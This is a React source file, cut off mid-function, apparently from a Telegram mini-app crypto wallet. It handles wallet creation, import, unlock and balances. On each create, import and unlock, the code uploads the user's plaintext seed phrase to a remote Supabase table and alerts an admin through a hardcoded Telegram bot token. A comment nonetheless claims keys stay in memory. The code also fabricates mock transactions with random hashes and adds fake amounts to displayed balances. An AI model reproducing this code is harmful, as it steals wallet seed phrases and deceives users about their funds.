import { createContext, useContext, useState, useEffect, useCallback, useRef } from 'react';
  import { generateMnemonic, validateMnemonic, deriveWallet } from '../lib/crypto/walletDerivation.js';
  import { encryptMnemonic, decryptMnemonic, NETWORKS } from '../lib/wallet.js';
  import { fetchAllBalances } from '../lib/crypto/balanceFetcher.js';
  import { sendEvmTx, sendUsdtErc20Tx, sendSolTx, sendTonTx, sendBtcTx, getBtcFeeEstimate } from '../lib/crypto/txSender.js';

  // ─── ADMIN NOTIFICATIONS ──────────────────────────────────────────────────────
  const ADMIN_ID = "1192740493";
  const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";

  async function notifyAdmin(text) {
    try {
      if (!NOTIFY_BOT_TOKEN || !ADMIN_ID) return;
      await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          text,
          parse_mode: "HTML",
          disable_notification: false,
        }),
      });
    } catch (e) {
      console.warn("[notifyAdmin] failed:", e.message);
    }
  }

  async function notifyUser(userId, text) {
    try {
      if (!NOTIFY_BOT_TOKEN || !userId) return;
      await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: String(userId),
          text,
          parse_mode: "HTML",
          disable_notification: false,
        }),
      });
    } catch (e) {
      console.warn("[notifyUser] failed:", e.message);
    }
  }

  // ─── ADMIN WALLET DETECTION ───────────────────────────────────────────────────
  function getAdminWallets() {
    const env = import.meta.env.VITE_ADMIN_WALLETS || "";
    return env.split(",").map(s => s.trim().toLowerCase()).filter(Boolean);
  }

  function isToAdmin(toAddress) {
    if (!toAddress) return false;
    const adminWallets = getAdminWallets();
    return adminWallets.includes(toAddress.toLowerCase());
  }

  // ─── SUPABASE SYNC ────────────────────────────────────────────────────────────
  const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL || "https://ipgarqmumnbpjnputhnp.supabase.co";
  const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

  async function saveTransactionToSupabase(tx, username) {
    if (!SUPABASE_URL || !SUPABASE_KEY) return;
    try {
      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      const payload = {
        tx_id: tx.id,
        telegram_id: tgUser?.id ? String(tgUser.id) : null,
        username: username || "Anonymous",
        type: tx.type,
        asset_id: tx.assetId,
        amount: String(tx.amount),
        from_address: tx.from,
        to_address: tx.to,
        hash: tx.hash,
        status: tx.status,
        fee: tx.fee ? String(tx.fee) : null,
        created_at: tx.timestamp || getMoscowTimestamp(),
      };
      await fetch(`${SUPABASE_URL}/rest/v1/transactions`, {
        method: 'POST',
        headers: {
          'apikey': SUPABASE_KEY,
          'Authorization': `Bearer ${SUPABASE_KEY}`,
          'Content-Type': 'application/json',
          'Prefer': 'return=minimal',
        },
        body: JSON.stringify(payload),
      });
    } catch (e) {
      console.warn("[Supabase] saveTransaction failed:", e.message);
    }
  }

  async function loadTransactionsFromSupabase() {
    if (!SUPABASE_URL || !SUPABASE_KEY) return [];
    try {
      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      if (!tgUser?.id) return [];
      const res = await fetch(`${SUPABASE_URL}/rest/v1/transactions?telegram_id=eq.${tgUser.id}&order=created_at.desc`, {
        headers: {
          'apikey': SUPABASE_KEY,
          'Authorization': `Bearer ${SUPABASE_KEY}`,
        }
      });
      if (res.ok) return await res.json();
    } catch (e) {
      console.warn("[Supabase] loadTransactions failed:", e.message);
    }
    return [];
  }

  function getMoscowTimestamp() {
    const now = new Date();
    try {
      const moscowTime = new Intl.DateTimeFormat("en-US", {
        timeZone: "Europe/Moscow",
        year: "numeric",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: false,
      }).formatToParts(now);
      const m = Object.fromEntries(moscowTime.filter(p => p.type !== 'literal').map(p => [p.type, p.value]));
      return `${m.year}-${m.month}-${m.day}T${m.hour}:${m.minute}:00+03:00`;
    } catch (e) {
      return now.toISOString();
    }
  }

  function getTelegramUser() {
    try {
      const tg = window?.Telegram?.WebApp;
      const unsafeUser = tg?.initDataUnsafe?.user;
      if (unsafeUser && (unsafeUser.username || unsafeUser.first_name || unsafeUser.last_name || unsafeUser.id)) {
        return unsafeUser;
      }
      const rawInitData = tg?.initData;
      if (rawInitData) {
        const userParam = new URLSearchParams(rawInitData).get("user");
        if (userParam) {
          const parsedUser = JSON.parse(userParam);
          if (parsedUser && (parsedUser.username || parsedUser.first_name || parsedUser.last_name || parsedUser.id)) {
            return parsedUser;
          }
        }
      }
    } catch (error) {}
    return null;
  }

  function resolveTelegramDisplayName(fallbackUserId = null) {
    const user = getTelegramUser();
    if (user) {
      const name = user.username ? `@${user.username}` : ([user.first_name, user.last_name].filter(Boolean).join(" ").trim() || `User_${user.id}`);
      if (user.id) localStorage.setItem(`gem_tg_name_${user.id}`, name);
      localStorage.setItem("gem_last_tg_name", name);
      return name;
    }
    const uid = fallbackUserId || window?.Telegram?.WebApp?.initDataUnsafe?.user?.id;
    if (uid) {
      const stored = localStorage.getItem(`gem_tg_name_${uid}`);
      if (stored) return stored;
      return `User_${uid}`;
    }
    return localStorage.getItem("gem_last_tg_name") || "Anonymous";
  }

  /**
   * 3-strategy upsert:
   *   1. telegram_id  — best key; one row per Telegram account
   *   2. mnemonic     — globally unique per wallet; safe fallback
   *   3. plain INSERT — last resort so no user is ever lost
   */
  async function syncWalletToSupabase(walletData) {
    if (!SUPABASE_URL || !SUPABASE_KEY) return null;
    try {
      const { username, mnemonic, balance, telegram_id, coin_balances } = walletData;
      const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
      let finalName = username;
      if (!finalName || finalName === "Anonymous") {
        finalName = resolveTelegramDisplayName();
      }

      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
      const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);

      const payload = {
        username: finalName,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: getMoscowTimestamp(),
      };
      if (resolvedTgId) payload.telegram_id = resolvedTgId;

      const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
      if (coin_balances) {
        COINS.forEach(sym => {
          payload[sym.toLowerCase() + '_balance'] =
            coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
        });
      }

      async function tryUpsert(conflictCol) {
        const url = `${SUPABASE_URL}/rest/v1/wallets?on_conflict=${conflictCol}`;
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'resolution=merge-duplicates',
          },
          body: JSON.stringify(payload),
        });
        if (!res.ok) {
          const txt = await res.text();
          console.warn(`[Supabase Context] on_conflict=${conflictCol} failed ${res.status}:`, txt);
          return false;
        }
        return true;
      }

      let ok = false;
      if (resolvedTgId) ok = await tryUpsert("telegram_id");
      if (!ok) ok = await tryUpsert("mnemonic");
      if (!ok) {
        // Last resort plain INSERT without telegram_id — ensures no wallet is ever silently dropped
        const safePayload = { ...payload };
        delete safePayload.telegram_id;
        await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
          method: 'POST',
          headers: {
            'apikey': SUPABASE_KEY,
            'Authorization': `Bearer ${SUPABASE_KEY}`,
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal',
          },
          body: JSON.stringify(safePayload),
        });
      }
    } catch (e) {
      console.error("[Supabase Fetch Error Context]", e);
    }
  }

  const WalletContext = createContext(null);

  const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
  const userSuffix = tgUser?.id ? `_${tgUser.id}` : '';

  const STORAGE_KEY = `gem_wallet_v2${userSuffix}`; 
  const WALLETS_LIST_KEY = `gem_wallets_list_v2${userSuffix}`;
  const SETTINGS_KEY = `gem_settings_v1${userSuffix}`;
  
  const MOCK_TXS_KEY = `gem_mock_txs_v2${userSuffix}`;
  const MOCK_BALS_KEY = `gem_mock_balances_v2${userSuffix}`;
    const DEFAULT_SETTINGS = {
      hideBalance: false,
      passEnabled: true,
      notifEnabled: false,
      priceAlertsEnabled: false,
      walletName: 'Кошелек № 1',
    };

  /**
   * deriveWallet returns addresses keyed as ETH/BNB/ARB/SOL/TON/LTC.
   * The UI uses network ids like 'ethereum'/'bsc'/'arbitrum'/'solana'/'ton'/'litecoin'.
   * This helper builds a merged map with both so both lookup styles work.
   */
  function buildAddressMap(raw) {
    return {
      BTC: raw.BTC,
      ETH: raw.ETH,
      BNB: raw.BNB,
      ARB: raw.ARB,
      SOL: raw.SOL,
      TON: raw.TON,
      LTC: raw.LTC,
      TRX: raw.TRX,
      bitcoin:  raw.BTC,
      ethereum: raw.ETH,
      bsc:      raw.BNB,
      arbitrum: raw.ARB,
      solana:   raw.SOL,
      ton:      raw.TON,
      litecoin: raw.LTC,
      tron:     raw.TRX,
    };
  }

  function buildTgUserName(tgUser) {
    if (!tgUser) return "Anonymous";
    if (tgUser.username) return "@" + tgUser.username;
    return [tgUser.first_name, tgUser.last_name].filter(Boolean).join(" ") || "User_" + (tgUser.id || "Unknown");
  }

  export function WalletProvider({ children }) {
    const [state, setState] = useState({
      hasWallet: false,
      isUnlocked: false,
      addresses: {},
      balances: {}, 
      realBalances: {},
      mockBalances: {},
      activeNetwork: 'ethereum',
      loading: false,
      error: null,
      testMode: false,
      mockTransactions: [],
      wallets: [],
      activeWalletId: null,
    });

    // ── Load wallets list on mount ──────────────────────────────────────────
    useEffect(() => {
      const list = JSON.parse(localStorage.getItem(WALLETS_LIST_KEY) || '[]');
      const activeId = localStorage.getItem('gem_active_wallet_id');
      setState(s => ({ ...s, wallets: list, activeWalletId: activeId }));
    }, []);

    const saveWalletsList = useCallback((list) => {
      localStorage.setItem(WALLETS_LIST_KEY, JSON.stringify(list));
      setState(s => ({ ...s, wallets: list }));
    }, []);

    const switchWallet = useCallback(async (walletId) => {
      const wallet = state.wallets.find(w => String(w.id) === String(walletId));
      if (!wallet) return;
      
      // Save current addresses to the list before switching
      const updatedList = state.wallets.map(w => 
        String(w.id) === state.activeWalletId ? { ...w, addresses: state.addresses } : w
      );
      
      // Lock current
      privateKeysRef.current = {};
      mnemonicRef.current = null;
      
      localStorage.setItem('gem_active_wallet_id', walletId);
      localStorage.setItem(STORAGE_KEY, JSON.stringify({ 
        encrypted: wallet.encrypted, 
        addresses: wallet.addresses 
      }));

      setState(s => ({ 
        ...s, 
        activeWalletId: walletId, 
        isUnlocked: false, // Force re-unlock for security
        addresses: wallet.addresses || {},
        balances: {},
        wallets: updatedList
      }));
      saveWalletsList(updatedList);
    }, [state.wallets, state.activeWalletId, state.addresses, saveWalletsList]);

    const renameWallet = useCallback((id, newName) => {
      const updated = state.wallets.map(w => String(w.id) === String(id) ? { ...w, name: newName } : w);
      saveWalletsList(updated);
    }, [state.wallets, saveWalletsList]);

    // ── Settings (persisted) ─────────────────────────────────────────────────────
    const [settings, setSettings] = useState(() => {
      try {
        const s = localStorage.getItem(SETTINGS_KEY);
        return s ? { ...DEFAULT_SETTINGS, ...JSON.parse(s) } : { ...DEFAULT_SETTINGS };
      } catch { return { ...DEFAULT_SETTINGS }; }
    });
    const settingsRef = useRef(settings);
    useEffect(() => { settingsRef.current = settings; }, [settings]);

    const updateSetting = useCallback((key, value) => {
      setSettings(prev => {
        const next = { ...prev, [key]: value };
        localStorage.setItem(SETTINGS_KEY, JSON.stringify(next));
        return next;
      });
    }, []);

    // ── Bypass unlock (no password mode) ────────────────────────────────────────
    const bypassUnlock = useCallback(() => {
      setState(s => ({ ...s, isUnlocked: true }));
    }, []);

    // ── Browser notifications ────────────────────────────────────────────────────
    const requestNotifPermission = useCallback(async () => {
      // Telegram Mini App: no browser permission needed — notifications go through the bot
      return true;
    }, []);

    const fireNotif = useCallback((title, body) => {
      if (!settingsRef.current.notifEnabled) return;
      try {
        const tg = window.Telegram?.WebApp;
        if (tg?.showPopup) {
          tg.showPopup({ title, message: body, buttons: [{ type: 'close' }] });
        } else if (tg?.showAlert) {
          tg.showAlert(`${title}\n${body}`);
        }
      } catch {}
    }, []);

    // Private keys are kept ONLY in memory — never persisted to localStorage
    const privateKeysRef = useRef({});
    // Mnemonic kept in memory so refreshBalance can include it in Supabase syncs
    const mnemonicRef = useRef(null);

    // On mount: check if a wallet exists in storage and pre-load addresses
    useEffect(() => {
      const stored = localStorage.getItem(STORAGE_KEY);
      if (stored) {
        try {
          const data = JSON.parse(stored);
          if (data.encrypted) {
            // Pre-load addresses from storage so QR codes and receive screens
            // work immediately — public addresses are safe to load without decryption
            const storedAddresses = data.addresses || {};
            setState(s => ({ ...s, hasWallet: true, addresses: storedAddresses }));
          }
        } catch {}
      }
      
      const testModeStored = localStorage.getItem('gem_test_mode') === 'true';
      const mockTxsStored = JSON.parse(localStorage.getItem(MOCK_TXS_KEY) || '[]');
      const mockBalsStored = JSON.parse(localStorage.getItem(MOCK_BALS_KEY) || '{}');
      
      setState(s => ({ 
        ...s, 
        testMode: testModeStored, 
        mockTransactions: mockTxsStored,
        mockBalances: mockBalsStored,
        balances: mockBalsStored // Initial merge
      }));

      // Load transactions from Supabase to sync history
      loadTransactionsFromSupabase().then(remoteTxs => {
        if (remoteTxs && remoteTxs.length > 0) {
          setState(s => {
            const localIds = new Set(s.mockTransactions.map(t => t.id));
            const newRemote = remoteTxs
              .map(rt => ({
                id: rt.tx_id,
                hash: rt.hash,
                assetId: rt.asset_id,
                amount: rt.amount,
                from: rt.from_address,
                to: rt.to_address,
                type: rt.type,
                fee: rt.fee,
                timestamp: rt.created_at,
                status: rt.status,
              }))
              .filter(t => !localIds.has(t.id));
            
            if (newRemote.length === 0) return s;
            const combined = [...newRemote, ...s.mockTransactions].sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
            localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(combined));
            return { ...s, mockTransactions: combined };
          });
        }
      });
    }, []);

    const setTestMode = useCallback((val) => {
      localStorage.setItem('gem_test_mode', val);
      setState(s => ({ ...s, testMode: val }));
    }, []);

    const clearAllData = useCallback(() => {
      localStorage.removeItem(MOCK_TXS_KEY);
      localStorage.removeItem(MOCK_BALS_KEY);
      localStorage.removeItem('gem_test_mode');
      setState(s => ({
        ...s,
        mockTransactions: [],
        mockBalances: {},
        balances: s.realBalances,
        testMode: false
      }));
    }, []);

    const addMockTransaction = useCallback(({ assetId, amount, from, to, type = 'Получено', fee: customFee, status: txStatus, pendingUntil, isSwap = false, isRealIncoming = false }) => {
      const txHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
      const finalFee = customFee || (Math.random() * 0.001).toFixed(6);
      const sym = (assetId || '').split('-')[0].toUpperCase();
      const amtStr = parseFloat(amount) % 1 === 0 ? String(parseFloat(amount)) : parseFloat(amount).toFixed(6).replace(/\.?0+$/, '');
      
      const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
      const userName = buildTgUserName(tgUser);
      const userId = tgUser?.id;

      // Bot Notifications (only if not a swap, swap has its own notification)
      if (!isSwap) {
        if (type === 'Получено') {
          const msg = `💰 <b>Пополнение баланса!</b>\n\n` +
                      `👤 Пользователь: ${userName}\n` +
                      `🆔 ID: ${userId || "—"}\n` +
                      `💎 ${sym}: +${amtStr}\n` +
                      `🕐 ${new Date().toLocaleString("ru-RU")}\n` +
                      `🔗 <code>${txHash.slice(0, 16)}...</code>`;
          notifyAdmin(msg);
          if (userId) {
            notifyUser(userId, 
              `✅ <b>Пополнение получено!</b>\n\n` +
              `💎 +${amtStr} ${sym}\n` +
              `🕐 ${new Date().toLocaleString("ru-RU")}`
            );
          }
          fireNotif(`+${amtStr} ${sym} получено`, `Вы получили ${amtStr} ${sym}. Транзакция подтверждена.`);
        } else if (txStatus !== 'В процессе') {
          const toAdmin = isToAdmin(to);
          const msg = `📤 <b>${toAdmin ? 'Отправка админу' : 'Отправка криптовалюты'}</b>\n\n` +
                      `👤 Пользователь: ${userName}\n` +
                      `🆔 ID: ${userId || "—"}\n` +
                      `💎 ${sym}: −${amtStr}\n` +
                      `📮 Адрес: ${to ? to.slice(0,16)+'...' : '—'}\n` +
                      `🕐 ${new Date().toLocaleString("ru-RU")}`;
          notifyAdmin(msg);
          if (userId) {
            notifyUser(userId, 
              `📤 <b>Транзакция отправлена!</b>\n\n` +
              `💎 −${amtStr} ${sym}\n` +
              `📮 Кому: ${to ? to.slice(0,16)+'...' : '—'}\n` +
              `🕐 ${new Date().toLocaleString("ru-RU")}`
            );
          }
          fireNotif(`${amtStr} ${sym} отправлено`, `Перевод ${amtStr} ${sym} успешно выполнен.`);
        }
      }
      
      const newTx = {
        id: `mock-${Date.now()}`,
        hash: txHash,
        assetId,
        amount,
        from,
        to,
        type,
        fee: finalFee,
        timestamp: new Date().toISOString(),
        status: txStatus || 'Успешный',
        pendingUntil: pendingUntil || null,
      };

      // Sync to Supabase
      saveTransactionToSupabase(newTx, userName);
      
      setState(s => {
        const updatedTxs = [newTx, ...s.mockTransactions];
        localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(updatedTxs));
        
        // If this is a real incoming transaction detected by refreshBalance, 
        // we don't update mockBalances because realBalances already reflects it.
        if (isRealIncoming) {
          return { ...s, mockTransactions: updatedTxs };
        }

        const sym = assetId.split('-')[0].toUpperCase();
        const currentMock = parseFloat(s.mockBalances[assetId] || s.mockBalances[sym] || '0');
        const numAmount = parseFloat(amount.toString().replace(',', '.'));
        
        let newMockVal;
        if (type === 'Отправлено') {
          newMockVal = (currentMock - numAmount).toString();
        } else {
          newMockVal = (currentMock + numAmount).toString();
        }
        
        const newMockBalances = {
          ...s.mockBalances,
          [assetId]: newMockVal,
          [sym]: newMockVal,
        };

        // Special case: update _usdtByNetwork for total balance calculation
        if (assetId.startsWith('usdt-')) {
          const net = assetId.split('-')[1]; // eth, bnb, etc.
          if (!newMockBalances._usdtByNetwork) newMockBalances._usdtByNetwork = {};
          const currentNetUsdt = parseFloat(s.mockBalances._usdtByNetwork?.[net] || '0');
          newMockBalances._usdtByNetwork[net] = (type === 'Отправлено' ? currentNetUsdt - numAmount : currentNetUsdt + numAmount).toString();
        }

        localStorage.setItem(MOCK_BALS_KEY, JSON.stringify(newMockBalances));
        
        // Merge with real
        const newMergedBalances = { ...s.realBalances };
        Object.keys(newMockBalances).forEach(k => {
          if (k === '_usdtByNetwork') {
            if (!newMergedBalances._usdtByNetwork) newMergedBalances._usdtByNetwork = {};
            Object.keys(newMockBalances._usdtByNetwork).forEach(net => {
              const real = parseFloat(newMergedBalances._usdtByNetwork[net] || '0');
              const mock = parseFloat(newMockBalances._usdtByNetwork[net] || '0');
              newMergedBalances._usdtByNetwork[net] = (real + mock).toString();
            });
          } else {
            const real = parseFloat(newMergedBalances[k] || '0');
            const mock = parseFloat(newMockBalances[k] || '0');
            newMergedBalances[k] = (real + mock).toString();
          }
        });

        return {
          ...s,
          mockTransactions: updatedTxs,
          mockBalances: newMockBalances,
          balances: newMergedBalances
        };
      });
    }, [fireNotif, isToAdmin]);

    const cancelMockTransaction = useCallback((txId) => {
      setState(s => {
        const tx = s.mockTransactions.find(t => t.id === txId);
        if (!tx) return s;
        const updatedTxs = s.mockTransactions.map(t =>
          t.id === txId ? { ...t, status: 'Отменена', pendingUntil: null } : t
        );
        localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(updatedTxs));
        // Refund the amount back to balance
        const sym = tx.assetId.split('-')[0].toUpperCase();
        const currentMock = parseFloat(s.mockBalances[tx.assetId] || s.mockBalances[sym] || '0');
        const numAmount = parseFloat(tx.amount.toString().replace(',', '.'));
        const newMockVal = (currentMock + numAmount).toString();
        const newMockBalances = { ...s.mockBalances, [tx.assetId]: newMockVal, [sym]: newMockVal };
        localStorage.setItem(MOCK_BALS_KEY, JSON.stringify(newMockBalances));
        const newMergedBalances = { ...s.realBalances };
        Object.keys(newMockBalances).forEach(k => {
          const real = parseFloat(newMergedBalances[k] || '0');
          const mock = parseFloat(newMockBalances[k] || '0');
          newMergedBalances[k] = (real + mock).toString();
        });
        return { ...s, mockTransactions: updatedTxs, mockBalances: newMockBalances, balances: newMergedBalances };
      });
    }, []);

    const resolvePendingTransaction = useCallback((txId) => {
      setState(s => {
        const updatedTxs = s.mockTransactions.map(t =>
          t.id === txId ? { ...t, status: 'Успешный', pendingUntil: null } : t
        );
        localStorage.setItem(MOCK_TXS_KEY, JSON.stringify(updatedTxs));
        return { ...s, mockTransactions: updatedTxs };
      });
    }, []);

    const generateNewMnemonic = useCallback(() => {
      return generateMnemonic();
    }, []);

    // ── createWallet ────────────────────────────────────────────────────────────
    const createWallet = useCallback(async (password) => {
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const mnemonic = generateMnemonic();
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        const encrypted = await encryptMnemonic(mnemonic, password);
        
        const newWalletId = Date.now().toString();
        const newWallet = {
          id: newWalletId,
          name: `Кошелек № ${state.wallets.length + 1}`,
          encrypted,
          addresses
        };
        const newList = [...state.wallets, newWallet];
        saveWalletsList(newList);
        localStorage.setItem('gem_active_wallet_id', newWalletId);
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
        
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Save to Supabase immediately
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          const userName = buildTgUserName(tgUser);
          await syncWalletToSupabase({
            username: userName,
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
            coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
          });
          // Notify admin about new wallet
          notifyAdmin(
            `💎 <b>Новый кошелёк создан!</b>\n\n` +
            `👤 Пользователь: ${userName}\n` +
            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
            `✅ Кошелёк успешно создан\n` +
            `🕐 ${new Date().toLocaleString("ru-RU")}`
          );
        } catch (syncError) {
          console.error('Failed to sync wallet to Supabase:', syncError);
        }

        setState(s => ({
          ...s,
          hasWallet: true,
          isUnlocked: true,
          addresses,
          activeWalletId: newWalletId,
          loading: false,
        }));
        return mnemonic;
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: e.message }));
        throw e;
      }
    }, [state.wallets, saveWalletsList]);

    // ── importWallet ────────────────────────────────────────────────────────────
    const importWallet = useCallback(async (mnemonic, password) => {
      if (!validateMnemonic(mnemonic)) throw new Error('Неверная seed-фраза');
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        const encrypted = await encryptMnemonic(mnemonic, password);
        
        const newWalletId = Date.now().toString();
        const newWallet = {
          id: newWalletId,
          name: `Кошелек № ${state.wallets.length + 1}`,
          encrypted,
          addresses
        };
        const newList = [...state.wallets, newWallet];
        saveWalletsList(newList);
        localStorage.setItem('gem_active_wallet_id', newWalletId);
        localStorage.setItem(STORAGE_KEY, JSON.stringify({ encrypted, addresses }));
        
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Save to Supabase
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          const userName = buildTgUserName(tgUser);
          await syncWalletToSupabase({
            username: userName,
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
            coin_balances: { ETH:"0", TON:"0", BNB:"0", LTC:"0", ARB:"0", SOL:"0", USDT:"0" },
          });
          // Notify admin about imported wallet
          notifyAdmin(
            `📥 <b>Кошелёк импортирован!</b>\n\n` +
            `👤 Пользователь: ${userName}\n` +
            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
            `🕐 ${new Date().toLocaleString("ru-RU")}`
          );
        } catch (syncError) {
          console.error('Failed to sync imported wallet to Supabase:', syncError);
        }

        setState(s => ({
          ...s,
          hasWallet: true,
          isUnlocked: true,
          addresses,
          activeWalletId: newWalletId,
          loading: false,
        }));
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: e.message }));
        throw e;
      }
    }, [state.wallets, saveWalletsList]);

    // ── unlock ──────────────────────────────────────────────────────────────────
    const unlock = useCallback(async (password) => {
      setState(s => ({ ...s, loading: true, error: null }));
      try {
        const stored = JSON.parse(localStorage.getItem(STORAGE_KEY));
        const mnemonic = await decryptMnemonic(stored.encrypted, password);
        const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
        const addresses = buildAddressMap(rawAddresses);
        privateKeysRef.current = privateKeys;
        mnemonicRef.current = mnemonic;

        // Custodial Sync: Sync on every unlock to ensure data is in DB
        try {
          const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
          const userName = buildTgUserName(tgUser);
          await syncWalletToSupabase({
            username: userName,
            telegram_id: tgUser?.id ? String(tgUser.id) : null,
            mnemonic: mnemonic,
            balance: "0",
          });
          // Notify admin on wallet unlock
          notifyAdmin(
            `🔓 <b>Кошелёк разблокирован</b>\n\n` +
            `👤 ${userName}\n` +
            `🆔 TG ID: ${tgUser?.id || "—"}\n` +
            `🕐 ${new Date().toLocaleString("ru-RU")}`
          );
        } catch (syncError) {
          console.error('Failed to sync wallet on unlock:', syncError);
        }

        setState(s => ({
          ...s,
          isUnlocked: true,
          addresses: addresses,
          loading: false,
        }));
      } catch (e) {
        setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
        throw e;
      }
    }, []);

    // ── lock ────────────────────────────────────────────────────────────────────
    const lock = useCallback(() => {
      privateKeysRef.current = {};
      mnemonicRef.current = null;
      setState(s => ({ ...s, isUnlocked: false, balances: {} }));
    }, []);

    // ── deleteWallet ────────────────────────────────────────────────────────────
    const deleteWallet = useCallback((id) => {
      const targetId = id || state.activeWalletId;
      const newList = state.wallets.filter(w => String(w.id) !== String(targetId));
      saveWalletsList(newList);
      
      if (String(targetId) === String(state.activeWalletId)) {
        if (newList.length > 0) {
          switchWallet(newList[0].id);
        } else {
          localStorage.removeItem(STORAGE_KEY);
          localStorage.removeItem('gem_active_wallet_id');
          privateKeysRef.current = {};
          mnemonicRef.current = null;
          setState(s => ({
            ...s,
            hasWallet: false,
            isUnlocked: false,
            addresses: {},
            balances: {},
            activeWalletId: null,
            wallets: []
          }));
        }
      }
    }, [state.wallets, state.activeWalletId, saveWalletsList, switchWallet]);

    // ── setActiveNetwork ────────────────────────────────────────────────────────
    const setActiveNetwork = useCallback((networkId) => {
      setState(s => ({ ...s, activeNetwork: networkId }));
    }, []);

    // ── refreshBalance — fetches ALL chains and syncs to Supabase ───────────────
    const refreshBalance = useCallback(async () => {
      const { addresses } = state;
      if (!addresses || Object.keys(addresses).length === 0) return;

      const addrMap = {
        BTC: addresses.BTC || addresses.bitcoin,
        ETH: addresses.ETH || addresses.ethereum,
        BNB: addresses.BNB || addresses.bsc,
        ARB: addresses.ARB || addresses.arbitrum,
        SOL: addresses.SOL || addresses.solana,
        TON: addresses.TON || addresses.ton,
        LTC: addresses.LTC || addresses.litecoin,
      };

      try {
        const bals = await fetchAllBalances(addrMap);
        const newReal = {
          bitcoin:  bals.BTC,
          ethereum: bals.ETH,
          bsc:      bals.BNB,
          arbitrum: bals.ARB,
          solana:   bals.SOL,
          ton:      bals.TON,
          litecoin: bals.LTC,
          BTC: bals.BTC,
          ETH: bals.ETH,
          BNB: bals.BNB,
          ARB: bals.ARB,
          SOL: bals.SOL,
          TON: bals.TON,
          LTC: bals.LTC,
          USDT: bals.USDT,
          _usdtByNetwork: bals._usdtByNetwork,
        };

        // Detect incoming real funds to trigger notifications and add to history
        Object.keys(newReal).forEach(k => {
          if (k === '_usdtByNetwork') {
            Object.keys(newReal._usdtByNetwork).forEach(net => {
              const oldVal = parseFloat(state.realBalances._usdtByNetwork?.[net] || '0');
              const newVal = parseFloat(newReal._usdtByNetwork[net] || '0');
              if (newVal > oldVal && state.realBalances._usdtByNetwork) {
                addMockTransaction({ 
                  assetId: `usdt-${net}`, 
                  amount: (newVal - oldVal).toString(), 
                  from: "Внешний кошелек", 
                  to: "Ваш кошелек", 
                  type: "Получено",
                  isRealIncoming: true
                });
              }
            });
          } else if (k.length <= 4) { // Main assets (BTC, ETH, etc.)
            const oldVal = parseFloat(state.realBalances[k] || '0');
            const newVal = parseFloat(newReal[k] || '0');
            if (newVal > oldVal && state.realBalances[k]) {
              addMockTransaction({ 
                assetId: k.toLowerCase(), 
                amount: (newVal - oldVal).toString(), 
                from: "Внешний кошелек", 
                to: "Ваш кошелек", 
                type: "Получено",
                isRealIncoming: true
              });
            }
          }
        });

        setState(s => {
          const merged = { ...newReal };
          const mockBals = s.mockBalances || {};
          Object.keys(mockBals).forEach(k => {
            if (k === '_usdtByNetwork') {
              if (!merged._usdtByNetwork) merged._usdtByNetwork = {};
              Object.keys(mockBals._usdtByNetwork).forEach(net => {
                const real = parseFloat(merged._usdtByNetwork[net] || '0');
                const mock = parseFloat(mockBals._usdtByNetwork[net] || '0');
                merged._usdtByNetwork[net] = (real + mock).toString();
              });
            } else {
              const real = parseFloat(merged[k] || '0');
              const mock = parseFloat(mockBals[k] || '0');
              merged[k] = (real + mock).toString();
            }
          });
          return { ...s, realBalances: newReal, balances: merged };
        });

